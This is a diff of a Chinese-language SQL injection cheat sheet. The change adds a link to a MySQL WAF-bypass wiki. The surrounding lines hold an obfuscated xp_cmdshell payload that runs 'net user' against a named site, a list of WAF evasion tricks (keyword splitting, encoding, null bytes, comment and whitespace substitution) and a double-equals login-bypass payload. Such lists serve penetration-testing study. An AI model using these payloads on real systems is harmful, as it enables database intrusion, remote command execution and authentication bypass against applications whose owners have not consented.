@@ -344,9 +344,11 @@ cnseay.com/1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell "net user"')
 
 
 ## 绕过
+https://github.com/aleenzz/MYSQL_SQL_BYPASS_WIKI
 
 sql注入绕行waf:；POST ，cookie中转,大小写混合，替换关键字，使用编码(16进制，hex编码)，使用注释，等价函数和命令，使用特殊符号，http参数控制，pwn ,select \`version()\` %0A,%20
 sel%00ect,%20=>空格,/!**/ => 空格 异常method，`~ ！+ -`连接符
+
 ### 双等号绕过
 username=p'='&password=p'='  
 
